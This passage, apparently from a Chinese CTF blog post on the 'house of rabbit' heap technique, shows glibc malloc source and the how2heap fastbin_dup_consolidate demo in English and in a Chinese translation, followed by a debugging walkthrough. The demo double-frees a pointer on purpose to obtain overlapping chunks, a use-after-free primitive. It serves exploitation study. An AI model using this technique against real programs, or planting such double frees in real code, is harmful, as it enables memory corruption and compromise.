: <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>_int_mallnfo</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">int_mallinfo</span> <span class="params">(mstate av, <span class="keyword">struct</span> mallinfo *m)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  mbinptr b;</span><br><span class="line">  mchunkptr p;</span><br><span class="line">  INTERNAL_SIZE_T avail;</span><br><span class="line">  INTERNAL_SIZE_T fastavail;</span><br><span class="line">  <span class="type">int</span> nblocks;</span><br><span class="line">  <span class="type">int</span> nfastblocks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure initialization */</span></span><br><span class="line">  <span class="keyword">if</span> (av-&gt;top == <span class="number">0</span>)</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  check_malloc_state (av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Account for top */</span></span><br><span class="line">  avail = chunksize (av-&gt;top);</span><br><span class="line">  nblocks = <span class="number">1</span>;  <span class="comment">/* top always exists */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* traverse fastbins */</span></span><br><span class="line">  nfastblocks = <span class="number">0</span>;</span><br><span class="line">  fastavail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NFASTBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (p = fastbin (av, i); p != <span class="number">0</span>; p = p-&gt;fd)</span><br><span class="line">        &#123;</span><br><span class="line">          ++nfastblocks;</span><br><span class="line">          fastavail += chunksize (p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  avail += fastavail;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* traverse regular bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      b = bin_at (av, i);</span><br><span class="line">      <span class="keyword">for</span> (p = last (b); p != b; p = p-&gt;bk)</span><br><span class="line">        &#123;</span><br><span class="line">          ++nblocks;</span><br><span class="line">          avail += chunksize (p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  m-&gt;smblks += nfastblocks;</span><br><span class="line">  m-&gt;ordblks += nblocks;</span><br><span class="line">  m-&gt;fordblks += avail;</span><br><span class="line">  m-&gt;uordblks += av-&gt;system_mem - avail;</span><br><span class="line">  m-&gt;arena += av-&gt;system_mem;</span><br><span class="line">  m-&gt;fsmblks += fastavail;</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      m-&gt;hblks = mp_.n_mmaps;</span><br><span class="line">      m-&gt;hblkhd = mp_.mmapped_mem;</span><br><span class="line">      m-&gt;usmblks = mp_.max_total_mem;</span><br><span class="line">      m-&gt;keepcost = chunksize (av-&gt;top);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>mallopt函数</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libc_mallopt (<span class="type">int</span> param_number, <span class="type">int</span> value)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av = &amp;main_arena;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &lt; <span class="number">0</span>)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">  (<span class="type">void</span>) mutex_lock (&amp;av-&gt;mutex);</span><br><span class="line">  <span class="comment">/* Ensure initialization/consolidation */</span></span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_mallopt, <span class="number">2</span>, param_number, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (param_number)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> M_MXFAST:</span><br><span class="line">      <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_mxfast, <span class="number">2</span>, value, get_max_fast ());</span><br><span class="line">          set_max_fast (value);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        res = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_TRIM_THRESHOLD:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_trim_threshold, <span class="number">3</span>, value,</span><br><span class="line">                  mp_.trim_threshold, mp_.no_dyn_threshold);</span><br><span class="line">      mp_.trim_threshold = value;</span><br><span class="line">      mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_TOP_PAD:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_top_pad, <span class="number">3</span>, value,</span><br><span class="line">                  mp_.top_pad, mp_.no_dyn_threshold);</span><br><span class="line">      mp_.top_pad = value;</span><br><span class="line">      mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_MMAP_THRESHOLD:</span><br><span class="line">      <span class="comment">/* Forbid setting the threshold too high. */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) value &gt; HEAP_MAX_SIZE / <span class="number">2</span>)</span><br><span class="line">        res = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_mmap_threshold, <span class="number">3</span>, value,</span><br><span class="line">                      mp_.mmap_threshold, mp_.no_dyn_threshold);</span><br><span class="line">          mp_.mmap_threshold = value;</span><br><span class="line">          mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_MMAP_MAX:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_mmap_max, <span class="number">3</span>, value,</span><br><span class="line">                  mp_.n_mmaps_max, mp_.no_dyn_threshold);</span><br><span class="line">      mp_.n_mmaps_max = value;</span><br><span class="line">      mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_CHECK_ACTION:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_check_action, <span class="number">2</span>, value, check_action);</span><br><span class="line">      check_action = value;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_PERTURB:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_perturb, <span class="number">2</span>, value, perturb_byte);</span><br><span class="line">      perturb_byte = value;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_ARENA_TEST:</span><br><span class="line">      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_arena_test, <span class="number">2</span>, value, mp_.arena_test);</span><br><span class="line">          mp_.arena_test = value;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_ARENA_MAX:</span><br><span class="line">      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_arena_max, <span class="number">2</span>, value, mp_.arena_max);</span><br><span class="line">          mp_.arena_max = value;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>该实验也是来自github项目中的<code>how2heap</code>，在<code>how2heap</code>中，这个实验的文件名叫做<code>fastbin_dup_consolidate.c</code></li><li>注意：<code>house_of_rabbit</code>这个利用方式很多，主要就是利用<code>malloc_consolidate</code>，至于伪造堆块的方式，可以在做题中进行归纳。</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a</span></span><br><span class="line"><span class="comment">double free to gain two pointers to the same large-sized chunk, which is usually difficult to do </span></span><br><span class="line"><span class="comment">directly due to the previnuse check.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially</span></span><br><span class="line"><span class="comment">merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top</span></span><br><span class="line"><span class="comment">if possible.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">As of glibc version 2.35 it is called only in the following five places:</span></span><br><span class="line"><span class="comment">1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)</span></span><br><span class="line"><span class="comment">2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)</span></span><br><span class="line"><span class="comment">3. _int_free: If the chunk size is &gt;= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)</span></span><br><span class="line"><span class="comment">4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)</span></span><br><span class="line"><span class="comment">5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">We will be targeting the first place, so we will need to allocate a chunk that does not belong in the </span></span><br><span class="line"><span class="comment">small bin (since we are trying to get into the &#x27;else&#x27; branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). </span></span><br><span class="line"><span class="comment">This means our chunk will need to be of size &gt;= 0x400 (it is thus large-sized).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocate a fastbin chunk p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add it to the fastbin.\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a chunk with chunk size 0x410. p3=%p\n&quot;</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nmalloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So p1 is double freed, and p3 hasn&#x27;t been freed although it now points to the top, as our\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk got consolidated with it. We have thus achieved UAF!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 and p1 will still be pointing to it.\n&quot;</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We now have two pointers (p3 and p4) that haven&#x27;t been directly freed\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;and both point to the same large-sized chunk. p3=%p p4=%p\n&quot;</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We have achieved duplication!\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>还是老样子，把这个代码翻译一遍</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">源代码来源: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这个文档主要被使用展示malloc——consolidate并且它怎样被double free充分利用从而获得两个指向相同大小chunk的指针,这两个指针一般情况下由于previnuse检查很难被常规的利用.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) </span></span><br><span class="line"><span class="comment">本质上是合并所有相邻的处于fastbin中的堆块,合并后会将这个大堆块放入unsorted bin中,并且如果可以就会将top合并.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在glibc 2.35中它仅仅在以下五个地方被调用:</span></span><br><span class="line"><span class="comment">1. _int_malloc: 一个处于large sized范围的chunk正在被分配(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)</span></span><br><span class="line"><span class="comment">2. _int_malloc: 没有bins被寻找到并且top chunk太小了(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)</span></span><br><span class="line"><span class="comment">3. _int_free: 如果这个chunk的大小&gt;= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)</span></span><br><span class="line"><span class="comment">4. mtrim: 总是调用 (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)</span></span><br><span class="line"><span class="comment">5. __libc_mallopt: 总是调用 (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我们将在第一个地方触发, 因此我们将需要分配一个不属于smallbin的堆块 (因为我们尝试进入这个检查的else分支中: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). </span></span><br><span class="line"><span class="comment">这意味着我们的chunk的size &gt;= 0x400 (它因是large-sized).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个技术充分利用malloc_consolidate和double free去创造一个UAF或者一对large-sized chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分配一个fastbin大小的chunk p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放p1所指向的堆块,这个堆块将被放入fastbin中.\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;为了触发malloc_consolidate,我们需要再分配一个chunk,这个这个chunk的大小位于large chunk的范围(size&gt;=0x400)\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;对应着我们malloc传递的参数要求&gt;= 0x3f0. 这里我们使用malloc(0x400), 这时我们将申请到\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;一个大小为0x410的堆块.其堆地址为: p3=%p\n&quot;</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nmalloc_consolidate 将p1指向的堆块(这个堆块已经被放入fastbin中了)与top chunk合并.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3所指向的堆块是从top chunk中切割下来的,因为没有没有bins储存的chunk比我们p3所指向的堆块大. 因此, p1 = p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;我们将对double free p1, 现在p1指向的是0x410大小的chunk,这个chunk我们只分配给p3.\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;因此p1处于double freed的状态, and尽管p3现在指向的是top chunk但是p3还没有被释放,因为我们的chunk\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;与它(top chunk)合并.我们实现了UAF!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们将申请一个0x400大小的chunk, 这会使得我们能从top_chunk得到0x410大小的chunk\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 and p1 将仍然指向之前的堆块.\n&quot;</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们现在有两个指针(p3 and p4),这两个指针并不能直接被释放\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;并且这两个指针都指向相同的large-sized chunk. p3=%p p4=%p\n&quot;</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们直线了duplication!\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来我们跟着实验的代码去动调走一走。我们先使用<code>calloc</code>这个函数申请了<code>0x40</code>大小的堆块</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307090316390.png" alt="image-20250307090316390"></p><ul><li>然后我们会将这个堆块释放，这个堆块释放后并不会马上与<code>Top chunk</code>合并，还是会先放入<code>fastbin</code>中。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307090545217.png" alt="image-20250307090545217"></p><ul><li>然后我们再申请一个处于<code>large bin</code>范围的大小，这里我们选择申请<code>0x400</code>大小的堆块，这时<code>malloc</code>为了减小系统调用的次数，<code>malloc</code>这个函数就会将<code>fastbin</code>中的空闲堆块进行处理。如果处理的对抗与<code>top_chunk</code>相邻该堆块就会与<code>top chunk</code>合并，然后我们所申请的<code>0x400</code>大小堆块的地址就是上图中的<code>fastbin</code>中的地址</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307091145769.png" alt="image-20250307091145769"></p><ul><li>此时<code>p1</code>指针还没有被置<code>0</code>，这时我们就还可以对<code>p1</code>进行释放，这时我们就可以看到，当我们释放<code>p1</code>这个指针的时候就会使得我们所申请的<code>0x400</code>大小的堆块释放后与<code>top_chunk</code>合并，这时<code>top_chunk</code>的地址就变成了我们原来申请的堆块的地址</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307091529801.png" alt="image-20250307091529801"></p><ul><li>之后我们再申请<code>0x400</code>大小的堆块，这样我们的<code>p3</code>指针和<code>p4</code>指针就指向了同一个堆块。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250307092126413.png" 